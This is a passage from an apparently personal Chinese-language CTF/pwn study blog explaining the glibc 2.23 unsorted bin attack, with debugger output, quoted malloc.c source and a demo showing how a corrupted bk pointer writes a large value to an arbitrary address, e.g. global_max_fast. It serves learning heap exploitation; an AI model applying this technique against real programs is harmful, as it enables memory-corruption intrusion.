class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure>

<p>申请过程如下图所示：</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p>
<p>核心代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure>

<p>运行结果如下:</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span>				<span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure>

<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>再来看一下unsortedbin的源码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     {<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         {<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             {<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             }<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         }<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure>

<p>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，<strong>victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure>

<p>这里我们可以看到 <strong>unsorted bin attack 确实可以修改任意地址的值</strong>，<strong>但是所修改成的值却不受我们控制</strong>，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说<br>● <strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong><br><strong>●</strong> <strong>我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉全篇看最后一句话就够了(哈哈哈)</p>
<p>总结一下unsortedbin attack这种攻击方式：<br>首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值</p>
<blockquote>
<p>target_addr：目标地址（想要修改为超大数的地址） </p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/">← Next HITCON Training lab14 magic heap</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/13/0ctf_2017_BabyHeap/">0ctf_2017_BabyHeap Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eunsorted-bin-%E5%92%8C-unsorted-bin-attack"><span class="toc-number">1.</span> <span class="toc-text">关于unsorted bin 和 unsorted bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsotedbin-%E5%9F%BA%E6%9C%AC%E6%9D%A5%E6%BA%90"><span class="toc-number">1.2.</span> <span class="toc-text">unsotedbin 基本来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-attack-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.</span> <span class="toc-text">unsortedbin_attack 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-attack-%E6%95%88%E6%9E%9C"><span class="toc-number">1.4.</span> <span class="toc-text">unsortedbin_attack 效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">unsortedbin 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsortedbin-attack-%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">unsortedbin_attack 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">1.7.</span> <span class="toc-text">Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.7.1.</span> <span class="toc-text">开始调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cunsigned-long-p-x3D-malloc-0x410"><span class="toc-number">1.7.2.</span> <span class="toc-text">执行unsigned long *p&#x3D;malloc(0x410);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cmalloc-500"><span class="toc-number">1.7.3.</span> <span class="toc-text">执行malloc(500);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cfree-p"><span class="toc-number">1.7.4.</span> <span class="toc-text">执行free(p)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cp-1-x3D-unsigned-long-amp-stack-var-2"><span class="toc-number">1.7.5.</span> <span class="toc-text">执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cmalloc-0x410"><span class="toc-number">1.7.6.</span> <span class="toc-text">执行malloc(0x410)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%80%9D"><span class="toc-number">1.8.</span> <span class="toc-text">反思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>